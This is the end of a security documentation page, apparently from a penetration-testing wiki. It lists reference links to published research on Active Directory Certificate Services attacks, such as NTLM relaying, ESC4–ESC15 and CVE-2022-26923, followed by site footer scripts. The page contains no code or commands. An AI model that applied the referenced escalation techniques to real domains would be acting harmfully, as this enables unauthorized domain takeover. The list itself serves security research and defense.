<li><a href="https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/">NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema</a></li>
<li><a href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/">AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021</a></li>
<li><a href="https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4">ADCS: Playing with ESC4 - Matthew Creel</a></li>
<li><a href="https://www.blackarrow.net/adcs-weaponizing-esc7-attack/">AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022</a></li>
<li><a href="https://www.blackarrow.net/ad-cs-from-manageca-to-rce/">AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh</a></li>
<li><a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash">UnPAC the hash - The Hacker Recipes</a></li>
<li><a href="https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/">AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev</a></li>
<li><a href="https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/">Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER</a></li>
<li><a href="https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html">bloodyAD and CVE-2022-26923 - soka - 11 May 2022</a></li>
<li><a href="https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d">Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates">Certificate templates - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration">CA configuration - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/access-controls">Access controls - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints">Web endpoints - The Hacker Recipes</a></li>
<li><a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53">ADCS ESC13 Abuse Technique - Jonas Bülow Knudsen - 02/15/2024</a></li>
<li><a href="https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c">From DA to EA with ESC5 - Andy Robbins - May 16, 2023</a></li>
<li><a href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9">ADCS ESC14 Abuse Technique - Jonas Bülow Knudsen - 02/01/2024</a></li>
<li><a href="https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547">ADCS Attack Paths in BloodHound — Part 2 - Jonas Bülow Knudsen - May 1, 2024</a></li>
<li><a href="https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm">ESC12 – Shell access to ADCS CA with YubiHSM - hajo - October 2023</a></li>
<li><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#shell-access-to-adcs-ca-with-yubihsm-esc12">AD CS Domain Escalation - HackTricks</a></li>
<li><a href="https://github.com/ly4k/Certipy/pull/228">ESC15/EKUwu PR #228 - dru1d-foofus - 10/08/2024</a></li>
<li><a href="https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc">EKUwu: Not just another AD CS ESC - Justin Bollinger - October 08, 2024</a></li>
<li><a href="https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760">ADCS Exploitation Part 2: Certificate Mapping + ESC15 - Giulio Pierantoni - Oct 10, 2024</a></li>
<li><a href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9">ADCS ESC14 Abuse Technique - Jonas Bülow Knudsen - February 28, 2024</a></li>
<li><a href="https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14">Exploitation de l’AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025</a></li>
<li><a href="https://www.mannulinux.org/2025/02/Curious-case-of-AD-CS-ESC15-vulnerable-instance-and-its-manual-exploitation.html">Curious case of AD CS ESC15 vulnerable instance and its manual exploitation - Mannu Linux - February 13, 2025</a></li>
</ul>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="April 2, 2025 17:13:55">April 2, 2025</span>
  </span>

    
    
    
    
  </aside>





                
  <div class="social-container">
    <b>Share this content</b>
    <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
      <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
      <a class="a2a_button_x"></a>
      <a class="a2a_button_telegram"></a>
      <a class="a2a_button_linkedin"></a>
      <a class="a2a_button_email"></a>
      <a class="a2a_button_microsoft_teams"></a>
    </div>
    <br>
    <script async src="https://static.addtoany.com/menu/page.js"></script>
  </div>
  <script defer src="https://cloud.umami.is/script.js" data-website-id="49aad71c-7d98-4635-8bd5-b6799c8874f8"></script>

              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
      
    
  </body>
</html>